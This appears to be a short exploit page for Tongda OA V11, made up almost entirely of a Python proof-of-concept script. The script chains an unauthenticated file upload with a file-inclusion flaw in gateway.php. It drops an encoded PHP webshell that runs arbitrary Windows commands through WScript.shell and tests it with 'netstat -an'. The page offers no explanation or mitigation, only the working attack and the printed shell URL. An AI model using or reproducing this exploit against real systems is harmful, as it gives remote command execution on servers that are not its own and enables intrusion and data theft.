## 通达OA文件上传&文件包含

#### V11版（文件包含只存在此版本）

	# @userVersion : python 3.7
	# @Effect  : tongda_oa_exec
	
	import os
	import sys
	import requests
	def tongda_oa_file_include_check(target_url):
	    filename = "tongda_vul.php"
	    webshell = '''<?php
	            $fp = fopen('tongda_vul.php', 'w+');
	            $a = base64_decode("JTNDJTNGcGhwJTBBJTI0Y29tbWFuZCUzRCUyNF9HRVQlNWIlMjdhJTI3JTVkJTNCJTBBJTI0d3NoJTIwJTNEJTIwbmV3JTIwQ09NJTI4JTI3V1NjcmlwdC5zaGVsbCUyNyUyOSUzQiUwQSUyNGV4ZWMlMjAlM0QlMjAlMjR3c2gtJTNFZXhlYyUyOCUyMmNtZCUyMC9	jJTIwJTIyLiUyNGNvbW1hbmQlMjklM0IlMEElMjRzdGRvdXQlMjAlM0QlMjAlMjRleGVjLSUzRVN0ZE91dCUyOCUyOSUzQiUwQSUyNHN0cm91dHB1dCUyMCUzRCUyMCUyNHN0ZG91dC0lM0VSZWFkQWxsJTI4JTI5JTNCJTBBZWNobyUyMCUyNHN0cm91dHB1dCUzQiUwQSUzRiUzRQ==");
	            fwrite($fp, urldecode($a));
	            fclose($fp);
	            ?>'''
	    upload_url = target_url + "/ispirit/im/upload.php"
	    include_url = target_url + "/ispirit/interface/gateway.php"
	    shell_url = target_url + "/ispirit/interface/" + str(filename) + "?a=netstat -an"
	    files = {'ATTACHMENT': webshell}
	    upload_data = {"P": "123", "DEST_UID": "1", "UPLOAD_MODE": "2"}
	    upload_res = requests.post(upload_url, upload_data, files=files, timeout=5)
	    path = upload_res.text
	    path = path[path.find('@') + 1:path.rfind('|')].replace("_", "\/").replace("|", 	".")
	    include_data = {"json": "{\"url\":\"/general/../../attach/im/" + path + "\"}"}
	    include_res = requests.post(include_url, data=include_data, timeout=5)
	    shell_res = requests.get(shell_url)
	    if "ESTABLISHED" in shell_res.text:
	        print("The target is vulnerable ")
	        print("shell: "+shell_url)
	    else:
	        print("target is not vulnerable")
	
	if __name__ == '__main__':
	    if len(sys.argv)!=2:
	        print("use python tongda_oa_file_include.py http://127.0.0.1")
	        sys.exit()
	    tongda_oa_file_include_check(sys.argv[1])



